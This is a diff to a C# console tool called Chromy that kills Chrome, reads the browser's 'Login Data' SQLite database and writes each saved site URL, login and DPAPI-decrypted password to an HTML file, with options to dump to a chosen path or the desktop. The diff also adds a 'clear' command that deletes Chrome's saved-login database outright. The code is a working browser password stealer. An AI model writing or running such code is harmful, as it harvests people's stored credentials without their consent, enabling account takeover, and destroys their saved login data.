@@ -51,34 +51,57 @@ namespace Chromy
             }
             else if (cmd == "dump" && !cmd.Contains("-p"))
             {
-                Decrypt("");
+                // DUMP COMMAND 
 
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.Write("\n$> DUMP DONE!");
-                Console.ForegroundColor = ConsoleColor.Red;
+                var rows = Decrypt("");
+                if (rows == 0)
+                {
+                    PrintMe.PrintInfo("ERR ", ConsoleColor.Red, $"$> Something goes wrong.. Retry");
+                    return null;
+                }
+
+                PrintMe.PrintInfo(" OK ", ConsoleColor.Green, $"$> DUMP DONE! {rows} Items.");
             }
             else if(cmd.Contains("dump -p") && !cmd.Contains("-d"))
             {
+                // DUMP PATH COMMAND 
+
                 var spath = cmd.Split('-');
 
                 // remove 'p'
                 spath[1] = spath[1].Remove(0, 1);
+                var rows = Decrypt(spath[1]);
 
-                Decrypt(spath[1]);
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.Write("\n$> DUMP DONE!");
-                Console.ForegroundColor = ConsoleColor.Red;
+                if(rows == 0)
+                {
+                    PrintMe.PrintInfo("ERR ", ConsoleColor.Red, $"$> Something goes wrong.. Retry");
+                    return null;
+                }
+
+                PrintMe.PrintInfo(" OK ", ConsoleColor.Green, $"$> DUMP DONE! {rows} Items.");
             }
-            else if(cmd.Contains("dump -d") && !cmd.Contains("-p"))
+            else if((cmd.Contains("-d") && cmd.Contains("dump -d")) && !cmd.Contains("-p"))
             {
-                Decrypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("$> DUMP DONE!");
-                Console.ForegroundColor = ConsoleColor.Red;
+                // DUMP DESKTOP
+                var rows = Decrypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
+                if (rows == 0)
+                {
+                    PrintMe.PrintInfo("ERR ", ConsoleColor.Red, $"$> Something goes wrong.. Retry");
+                    return null;
+                }
+                PrintMe.PrintInfo(" OK ", ConsoleColor.Green, $"$> DUMP DONE! {rows} Items.");
+            }
+            else if(cmd == "clear" && !cmd.Contains("dump -d") && !cmd.Contains("-p"))
+            {
+                string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
+                 + "/Google/Chrome/User Data/Default/Login Data"; // path to database file
+                File.Delete(db_way);
+
+                PrintMe.PrintInfo(" OK ", ConsoleColor.Green, $"$> CLEAR DONE!");
             }
             else
             {
-                Console.WriteLine("$> Command not found. Retry.");
+                PrintMe.PrintInfo("ERR ", ConsoleColor.Red, $"$> Command not found. Retry.");
             }
 
             return null; 
@@ -92,17 +115,22 @@ namespace Chromy
                 p.Kill();
         }
 
-        private static bool Decrypt(string path)
+        private static int Decrypt(string path)
         {
             try
             {
-                Console.WriteLine("$> Killing Chrome");
+
+                PrintMe.PrintInfo("INFO", ConsoleColor.Yellow, $"$> Killing Chrome");
                 KillChrome();
-                path += "\\ChromyDump.html";
+                if(path == "")
+                    path += "ChromyDump.html";
+                else
+                     path += "\\ChromyDump.html";
                 StreamWriter Writer = new StreamWriter(path, false, Encoding.UTF8);
                 string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                     + "/Google/Chrome/User Data/Default/Login Data"; // path to database file
-                Console.WriteLine("$> DB file = " + db_way);
+                //Console.WriteLine("$> DB file = " + db_way);
+
 
                 string db_field = "logins";   // DB table field name
                 byte[] entropy = null; // DPAPI class does not use entropy but requires this parameter
@@ -113,17 +141,17 @@ namespace Chromy
                 string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
                 DataTable DB = new DataTable();
                 string sql = string.Format("SELECT * FROM {0} {1} {2}", db_field, "", "");
-
+                int rows = 0;
                 // for better closing use using key
                 using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
                 {
                     SQLiteCommand command = new SQLiteCommand(sql, connect);
                     SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                     adapter.Fill(DB);
-                    int rows = DB.Rows.Count;
+                       rows = DB.Rows.Count;
                     for (int i = 0; i < rows; i++)
                     {
-                        Writer.Write(i + 1 + ") "); // Here we print order number of our trinity "site-login-password"
+                        Writer.Write(i + 1 + "] "); // Here we print order number of our trinity "site-login-password"
                         Writer.WriteLine(DB.Rows[i][1] + "<br>"); // site URL
                         Writer.WriteLine(DB.Rows[i][3] + "<br>"); // login
                                                                   // Here the password description
@@ -135,14 +163,16 @@ namespace Chromy
                 }
 
                 Writer.Close();
-                return true;
+                return rows;
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.Message);
-                ex = ex.InnerException;
-                return false;
+                    PrintMe.PrintInfo("ERR ", ConsoleColor.Red, ex.Message);
+                // Console.WriteLine(ex.Message);
+            //    ex = ex.InnerException;
+                return 0;
             }
+            
         }
     }
 }
